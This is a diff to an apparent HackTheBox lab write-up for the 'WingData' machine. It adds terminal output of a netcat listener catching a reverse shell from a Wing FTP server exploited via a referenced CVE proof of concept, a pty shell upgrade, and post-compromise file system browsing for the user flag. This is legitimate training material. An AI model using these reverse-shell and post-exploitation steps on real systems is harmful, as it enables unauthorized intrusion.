@@ -653,6 +653,17 @@ The current shell is likely a "dumb" shell, meaning it lacks tab completion, job
 - `pty.spawn("/bin/bash")`
 	- Description: Terminal Spawning
 	- Purpose: Upgrades the current raw `/bin/sh` to a more feature-rich `/bin/bash` instance.
+
+**Output:**
+
+```shell
+┌──(kali㉿kali)-[~/pueman/HTB/WingData/CVE-2025-47812-poc]
+└─$ nc -lvnp 4444      
+listening on [any] 4444 ...
+connect to [10.10.14.247] from (UNKNOWN) [10.129.9.145] 45160
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+wingftp@wingdata:/opt/wftpserver$ 
+```
 <div align="center">
 <br>
 <br>
@@ -660,7 +671,43 @@ The current shell is likely a "dumb" shell, meaning it lacks tab completion, job
 
 ### 4.2 File System Discovery
 
+```shell
+wingftp@wingdata:/opt/wftpserver$ ls
+ls
+Data         pid-wftpserver.pid  version.txt  wftp_default_ssh.key
+License.txt  README              webadmin     wftp_default_ssl.crt
+Log          session             webclient    wftp_default_ssl.key
+lua          session_admin       wftpconsole  wftpserver
+wingftp@wingdata:/opt/wftpserver$ cd home
+cd home
+bash: cd: home: No such file or directory
+wingftp@wingdata:/opt/wftpserver$ cd /
+cd /
+wingftp@wingdata:/$ ls
+ls
+bin   etc         initrd.img.old  lost+found  opt   run   sys  var
+boot  home        lib             media       proc  sbin  tmp  vmlinuz
+dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
+wingftp@wingdata:/$ find / -name user.txt 2>/dev/null
+find / -name user.txt 2>/dev/null
+wingftp@wingdata:/$ cd -
+cd -
+/opt/wftpserver
+wingftp@wingdata:/opt/wftpserver$ cd -
+cd -
+/
+wingftp@wingdata:/$ cd home
+cd home
+wingftp@wingdata:/home$ ls
+ls
+wacky
+wingftp@wingdata:/home$ ls wacky
+ls wacky
+ls: cannot open directory 'wacky': Permission denied
+wingftp@wingdata:/home$ 
 
+
+```
 <div align="center">
 <br>
 <br>
